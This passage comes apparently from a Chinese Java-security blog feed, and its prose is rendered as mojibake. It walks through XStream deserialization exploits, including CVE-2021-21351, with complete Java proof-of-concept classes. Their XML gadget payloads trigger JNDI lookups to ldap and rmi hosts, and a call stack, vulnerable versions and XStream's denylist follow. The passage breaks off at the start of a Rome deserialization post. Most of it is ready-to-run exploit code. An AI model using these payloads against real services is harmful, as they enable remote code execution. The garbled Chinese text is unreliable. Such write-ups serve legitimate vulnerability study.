class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;threshold&gt;525&lt;/threshold&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;int&gt;700&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;int&gt;0&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;resourceCache/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;javax.swing.MultiUIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;tables&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;threshold&gt;525&lt;/threshold&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;int&gt;700&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;int&gt;1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;string&gt;lazyValue&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;sun.swing.SwingLazyValue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;methodName&gt;doLookup&lt;/methodName&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;args&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;string&gt;ldap://10.37.129.2:1389/tl4srb&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;/args&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/sun.swing.SwingLazyValue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;defaultLocale reference=&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;resourceCache/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/tables&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/javax.swing.MultiUIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šè¿™æ¡é“¾éœ€è¦Xstreamä¾èµ–ä¸º1.4.15 æœ‰ç‰ˆæœ¬é™åˆ¶</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡é“¾çš„å…¥å£ç‚¹å˜äº†ä¸åœ¨æ˜¯PriorityQueueè€Œæ˜¯MultiUIDefaultsè¿™ä¸ªç±»æˆ‘ä»¬åŒæ ·çš„çœ‹çœ‹å…¶è°ƒç”¨è¿‡ç¨‹</p><p>ä¸»è¦çš„å…³é”®ç‚¹åœ¨SwingLazyValueç±»çš„createæ–¹æ³•ä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735397037808-4e8871af-1a0a-4970-883d-f71fdbb76ed7.png"><br>è¿™ä¸ªæ–¹æ³•é‡Œè°ƒç”¨äº†invokeæ–¹æ³•åé¢å¯ä»¥åˆ©ç”¨ldapæ³¨å…¥ï¼Œè°ƒç”¨æ ˆåˆ—ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">doLookup:<span class="number">290</span>, InitialContext (javax.naming)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">createValue:<span class="number">73</span>, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:<span class="number">216</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">161</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">64</span>, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:<span class="number">197</span>, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:<span class="number">441</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:<span class="number">420</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">121</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">92</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">71</span>, CVE_2021 (com.ocean)</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE_2021_21351"></a>CVE_2021_21351</h2><h3 id="æµ‹è¯•ç¯å¢ƒ-5"><a href="#æµ‹è¯•ç¯å¢ƒ-5" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>è¿˜æ˜¯å…ˆå±•ç¤ºpayloadå†å»åˆ†æåŸå› </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021_21351</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__DTMXRTreeFrag&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__size&gt;-10086&lt;/m__size&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__mgrDefault&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;__useServicesMechanism&gt;false&lt;/__useServicesMechanism&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__incremental&gt;false&lt;/m__incremental&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__source__location&gt;false&lt;/m__source__location&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__dtms&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/m__dtms&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__defaultHandler/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__mgrDefault&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__indexing&gt;false&lt;/m__indexing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;dataSource&gt;rmi://localhost:1099/tl4srb&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/fPullParserConfig&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fConfigSetInput&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;name&gt;setAutoCommit&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;class&gt;boolean&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/fConfigSetInput&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__incrementalSAXSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__walker&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__walker&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__idAttributes/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/m__dtm&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/m__DTMXRTreeFrag&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>XStreamä¸ºäº†é˜²æŠ¤è¿™äº›æ¼æ´ï¼Œç›´æ¥ä½¿ç”¨é»‘åå•çš„æ–¹å¼å¯¹å¯åˆ©ç”¨é“¾çš„ç›¸å…³ç±»è¿›è¡Œæ‹¦æˆªï¼Œå¦‚1.4.15ä¸­XStream.classç±»ä¸­çš„setupSecurityå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setupSecurity</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.securityMapper != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="built_in">this</span>.denyTypes(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>&#125;);</span><br><span class="line">        <span class="built_in">this</span>.denyTypesByRegExp(<span class="keyword">new</span> <span class="title class_">Pattern</span>[]&#123;LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM&#125;);</span><br><span class="line">        <span class="built_in">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="built_in">this</span>.securityInitialized = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“å‚è€ƒï¼š<a href="https://paper.seebug.org/1543/#5-cve-2021-21351">https://paper.seebug.org/1543/#5-cve-2021-21351</a></p><p><a href="https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</a></p><p><a href="https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/">https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Xstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Romeååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰æ²¡å­¦ä¹ è¿‡romeååºåˆ—åŒ–è¿™é‡Œå­¦ä¹ ä¸€ä¸‹å› ä¸ºèƒ½å’ŒäºŒæ¬¡ååºåˆ—åŒ–ç»“åˆ</p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ROME æ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ– Java å¯¹è±¡ã€‚ROME å…¼å®¹äº† RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 ä»¥åŠ Atom 1.0 feeds æ ¼å¼ã€‚</p><p>Rome æä¾›äº† ToStringBean è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œã€‚</p><h2 id="ç¯å¢ƒä¾èµ–"><a href="#ç¯å¢ƒä¾èµ–" class="headerlink" title="ç¯å¢ƒä¾èµ–"></a>ç¯å¢ƒä¾èµ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•æµç¨‹"><a href="#è°ƒè¯•æµç¨‹" class="headerlink" title="è°ƒè¯•æµç¨‹"></a>è°ƒè¯•æµç¨‹</h2><p>è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* 